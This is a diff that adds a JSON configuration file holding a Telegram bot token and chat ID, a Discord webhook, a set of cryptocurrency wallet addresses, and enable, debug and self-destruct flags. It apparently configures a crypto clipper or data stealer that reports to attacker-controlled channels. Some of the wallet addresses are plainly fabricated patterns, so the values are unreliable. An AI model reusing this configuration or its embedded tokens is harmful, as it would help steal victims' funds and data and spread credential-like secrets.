@@ -1,0 +1,15 @@
+{
+    "botToken": "7978003950:AAFcFax1cTW4iz3gSl6NsTKL_XoeQURLOdI",
+    "chatId": "8051121194",
+    "discordWebhook": "https://discord.com/api/webhooks/1517793253007560805/5yEIQbXAc5vJtIaP5ZNLz96kQU6CqsaFGR4VUTS5tpQLrRMzycFOtCL9j_6pZl5vRfO7",
+    "cryptos": {
+        "BTC": "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
+        "ETH": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+        "XMR": "42f9Lx3J5zY3Xg6Q7H8w9e4r5t6y7u8i9o0p1a2s3d4f5g6h7j8k9l0",
+        "LTC": "LM2oQhMqX8vLh1T3p5R7w9e4r5t6y7u8i9o0p",
+        "DOGE": "D5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q"
+    },
+    "enabled": true,
+    "debug": false,
+    "selfDestruct": false
+}
